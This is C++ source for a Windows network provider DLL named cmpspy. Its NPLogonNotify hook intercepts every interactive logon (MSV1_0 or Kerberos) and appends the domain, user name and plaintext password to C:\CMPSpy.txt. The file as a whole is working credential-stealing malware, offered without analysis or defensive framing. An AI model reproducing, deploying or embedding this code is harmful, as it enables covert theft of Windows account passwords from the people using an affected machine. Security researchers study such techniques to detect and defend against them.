// cmpspy.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"


void SavePassword(PUNICODE_STRING logondomainname, PUNICODE_STRING username, PUNICODE_STRING password)
{
	HANDLE hFile;
	DWORD dwWritten;

	hFile = CreateFile(TEXT("C:\\CMPSpy.txt"),
		GENERIC_WRITE,
		0,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		SetFilePointer(hFile, 0, NULL, FILE_END);
		if (logondomainname->Length > 0)
		{
			WriteFile(hFile, logondomainname->Buffer, logondomainname->Length, &dwWritten, 0);
			WriteFile(hFile, L" -> ", 8, &dwWritten, 0);
		}

		WriteFile(hFile, username->Buffer, username->Length, &dwWritten, 0);
		WriteFile(hFile, L" -> ", 8, &dwWritten, 0);
		WriteFile(hFile, password->Buffer, password->Length, &dwWritten, 0);
		WriteFile(hFile, L"\r\n", 4, &dwWritten, 0);
		CloseHandle(hFile);
	}
}


DWORD
APIENTRY
NPGetCaps(
	DWORD nIndex
)
{
	switch (nIndex)
	{
	case WNNC_SPEC_VERSION:
		return WNNC_SPEC_VERSION51;

	case WNNC_NET_TYPE:
		return WNNC_CRED_MANAGER;

	case WNNC_START:
		return WNNC_WAIT_FOR_START;

	default:
		return 0;
	}
}


DWORD
APIENTRY
NPLogonNotify(
	PLUID lpLogonId,
	LPCWSTR lpAuthInfoType,
	LPVOID lpAuthInfo,
	LPCWSTR lpPrevAuthInfoType,
	LPVOID lpPrevAuthInfo,
	LPWSTR lpStationName,
	LPVOID StationHandle,
	LPWSTR* lpLogonScript
)
{
	// MSV1_0:Interactive
	wstring lpAuthInfoTypeStr(lpAuthInfoType);
	wstring target = L"MSV1_0:Interactive";

	if (target == lpAuthInfoTypeStr)
	{
		SavePassword(
			&(((MSV1_0_INTERACTIVE_LOGON*)lpAuthInfo)->LogonDomainName),
			&(((MSV1_0_INTERACTIVE_LOGON*)lpAuthInfo)->UserName),
			&(((MSV1_0_INTERACTIVE_LOGON*)lpAuthInfo)->Password)
		);
	}
	else {
		SavePassword(
			&(((_KERB_INTERACTIVE_LOGON*)lpAuthInfo)->LogonDomainName),
			&(((_KERB_INTERACTIVE_LOGON*)lpAuthInfo)->UserName),
			&(((_KERB_INTERACTIVE_LOGON*)lpAuthInfo)->Password)
		);
	}

	lpLogonScript = NULL;
	return WN_SUCCESS;
}